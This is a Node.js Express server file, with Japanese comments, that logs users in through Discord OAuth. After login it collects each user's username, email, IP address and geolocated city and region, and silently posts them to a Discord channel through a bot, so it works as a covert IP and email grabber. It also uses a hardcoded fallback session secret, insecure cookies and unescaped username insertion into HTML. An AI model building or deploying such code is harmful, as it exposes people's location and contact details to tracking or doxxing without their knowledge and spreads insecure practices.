import express from "express";
import fetch from "node-fetch";
import geoip from "geoip-lite";
import session from "express-session";
import RedisStore from "connect-redis";
import Redis from "ioredis";
import { sendDiscordInfo } from "./discordBot.js";
import path from "path";
import { fileURLToPath } from "url";
import fs from "fs";
import dotenv from "dotenv";

dotenv.config();

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 3000;

// Redis セッション
const redisClient = new Redis(process.env.REDIS_URL);
const redisStore = new RedisStore({ client: redisClient });

app.use(session({
  store: redisStore,
  secret: process.env.SESSION_SECRET || "秘密鍵",
  resave: false,
  saveUninitialized: true,
  cookie: { secure: false, maxAge: 24*60*60*1000 }
}));

const CLIENT_ID = process.env.CLIENT_ID;
const CLIENT_SECRET = process.env.CLIENT_SECRET;
const REDIRECT_URI = process.env.REDIRECT_URI;
const OAUTH_SCOPE = "identify email";

app.get("/", (req, res) => res.redirect("/login"));

app.get("/login", (req, res) => {
  if (req.session.user) return res.redirect("/welcome");
  const url = `https://discord.com/api/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=code&scope=${OAUTH_SCOPE}`;
  res.redirect(url);
});

app.get("/callback", async (req, res) => {
  const code = req.query.code;
  if (!code) return res.redirect("/login");

  const tokenRes = await fetch("https://discord.com/api/oauth2/token", {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: new URLSearchParams({
      client_id: CLIENT_ID,
      client_secret: CLIENT_SECRET,
      grant_type: "authorization_code",
      code,
      redirect_uri: REDIRECT_URI,
      scope: OAUTH_SCOPE
    })
  });

  const tokenData = await tokenRes.json();
  if (!tokenData.access_token) return res.redirect("/login");

  const userRes = await fetch("https://discord.com/api/users/@me", {
    headers: { Authorization: `Bearer ${tokenData.access_token}` }
  });
  const userData = await userRes.json();

  const ip = req.headers["x-forwarded-for"]?.split(",")[0].trim() || req.connection.remoteAddress;
  const geo = geoip.lookup(ip) || {};

  const message = `ログイン情報：
ユーザー: ${userData.username}#${userData.discriminator}
メール: ${userData.email}
IP: ${ip}
地域: ${geo.region || "不明"} / ${geo.city || "不明"}`;

  await sendDiscordInfo(message);

  req.session.user = { username: userData.username, discriminator: userData.discriminator };
  res.redirect("/welcome");
});

app.get("/welcome", (req, res) => {
  const user = req.session.user;
  if (!user) return res.redirect("/login");

  let html = fs.readFileSync(path.join(__dirname, "public", "welcome.html"), "utf-8");
  html = html.replace("{{ username }}", user.username).replace("{{ discriminator }}", user.discriminator);
  res.send(html);
});

app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
